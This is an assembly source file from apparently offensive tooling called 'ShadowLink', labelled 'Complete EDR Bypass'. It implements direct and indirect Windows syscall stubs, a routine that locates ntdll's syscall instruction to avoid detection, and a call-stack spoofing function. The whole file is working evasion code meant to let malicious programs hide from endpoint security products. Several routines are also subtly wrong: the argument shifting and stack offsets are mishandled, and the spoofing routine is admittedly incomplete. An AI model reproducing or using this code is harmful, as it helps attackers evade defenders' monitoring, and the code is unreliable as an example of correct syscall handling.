; ShadowLink Direct Syscalls Assembly
; Phase 11: Complete EDR Bypass
;
; This provides the actual syscall execution stub.
; Compile with: nasm -f win64 syscalls_asm.asm -o syscalls_asm.o
;
; Usage from C:
;   extern NTSTATUS DoSyscall(DWORD syscallNumber, ...);
;   DoSyscall(g_Syscalls.NtAllocateVirtualMemory, processHandle, &baseAddress, ...);

bits 64
default rel

; Export the syscall function
global DoSyscall
global DoSyscall_Alt
global GetSyscallAddress

section .data
    ; Syscall stub that will be copied and modified
    syscall_template:
        db 0x4C, 0x8B, 0xD1           ; mov r10, rcx
        db 0xB8, 0x00, 0x00, 0x00, 0x00 ; mov eax, syscall_number (patched at runtime)
        db 0x0F, 0x05                  ; syscall
        db 0xC3                        ; ret
    syscall_template_size equ $ - syscall_template

section .text

;------------------------------------------------------------------------------
; DoSyscall - Execute a direct syscall
;
; Arguments (Windows x64 calling convention):
;   rcx = syscall number
;   rdx = arg1
;   r8  = arg2
;   r9  = arg3
;   [rsp+0x28] = arg4
;   [rsp+0x30] = arg5
;   ... etc
;
; Returns:
;   rax = NTSTATUS result
;------------------------------------------------------------------------------
DoSyscall:
    ; Save syscall number
    mov r10, rcx

    ; Shift arguments: rdx->rcx, r8->rdx, r9->r8, stack args shift
    mov rcx, rdx          ; arg1 -> rcx
    mov rdx, r8           ; arg2 -> rdx
    mov r8, r9            ; arg3 -> r8
    
    ; arg4 and beyond are on stack, need to adjust
    mov r9, [rsp + 28h]   ; arg4 from stack
    
    ; The syscall number goes in eax
    mov eax, r10d
    
    ; Execute syscall
    ; Note: On Windows, syscalls use r10 as first argument (copied from rcx)
    mov r10, rcx
    syscall
    
    ret

;------------------------------------------------------------------------------
; DoSyscall_Alt - Alternative syscall with all args from stack
;
; This version takes syscall number as first arg, then all NT args on stack
; Useful when you don't want to shuffle registers
;
; Arguments:
;   rcx = syscall number
;   [rsp+0x10] = arg1 (will be in rcx for NT call)
;   [rsp+0x18] = arg2
;   [rsp+0x20] = arg3
;   [rsp+0x28] = arg4
;   ...
;------------------------------------------------------------------------------
DoSyscall_Alt:
    ; Save syscall number
    mov eax, ecx
    
    ; Load arguments from stack shadow space + parameters
    mov rcx, [rsp + 10h]    ; arg1
    mov rdx, [rsp + 18h]    ; arg2
    mov r8, [rsp + 20h]     ; arg3
    mov r9, [rsp + 28h]     ; arg4
    
    ; Setup syscall
    mov r10, rcx            ; First arg to r10 (NT convention)
    
    ; Execute syscall
    syscall
    
    ret

;------------------------------------------------------------------------------
; GetSyscallAddress - Find the syscall instruction in ntdll
;
; This finds the actual syscall instruction location for indirect syscalls
; (Avoids pattern detection by calling syscall from ntdll's memory)
;
; Arguments:
;   rcx = pointer to Nt function in ntdll
;
; Returns:
;   rax = address of syscall instruction, or 0 if not found
;------------------------------------------------------------------------------
GetSyscallAddress:
    push rbx
    
    ; Search for syscall pattern (0F 05)
    mov rbx, rcx
    xor rax, rax
    
    ; Look within first 24 bytes of function
    mov ecx, 24
    
.search_loop:
    cmp word [rbx], 0x050F    ; syscall opcode (little endian)
    je .found
    inc rbx
    dec ecx
    jnz .search_loop
    
    ; Not found
    xor rax, rax
    jmp .done

.found:
    mov rax, rbx
    
.done:
    pop rbx
    ret

;------------------------------------------------------------------------------
; IndirectSyscall - Execute syscall using ntdll's syscall instruction
;
; This is stealthier because the syscall instruction is in ntdll's memory
; region, making it look more legitimate.
;
; Arguments:
;   rcx = address of syscall instruction in ntdll
;   rdx = syscall number
;   r8  = arg1
;   r9  = arg2
;   [rsp] = remaining args
;------------------------------------------------------------------------------
global IndirectSyscall
IndirectSyscall:
    ; Save syscall instruction address
    push rcx
    
    ; Move arguments
    mov eax, edx          ; syscall number
    mov rcx, r8           ; arg1
    mov rdx, r9           ; arg2
    mov r8, [rsp + 30h]   ; arg3
    mov r9, [rsp + 38h]   ; arg4
    
    ; Setup r10 (NT convention)
    mov r10, rcx
    
    ; Get syscall address and jump to it
    pop r11
    jmp r11               ; Jump to syscall instruction in ntdll
                          ; The syscall will return to our caller

;------------------------------------------------------------------------------
; SpoofCallStack - Call with spoofed return address
;
; This helps bypass stack-based detections by making the call stack
; look like it originated from a legitimate location.
;
; Arguments:
;   rcx = spoofed return address
;   rdx = real function to call
;   r8  = arg1 for function
;   r9  = arg2 for function
;------------------------------------------------------------------------------
global SpoofCallStack
SpoofCallStack:
    ; Save original return address
    pop rax               ; Get real return address
    
    ; Push spoofed return address
    push rcx              ; Push spoofed return
    
    ; Prepare arguments for target function
    mov rcx, r8           ; arg1
    mov r8, [rsp + 28h]   ; arg3 from stack
    
    ; Save real return for restoration
    mov [rsp - 8], rax
    
    ; Call target function
    call rdx
    
    ; The function will return to spoofed address...
    ; This is incomplete - full implementation needs gadgets
    
    ret
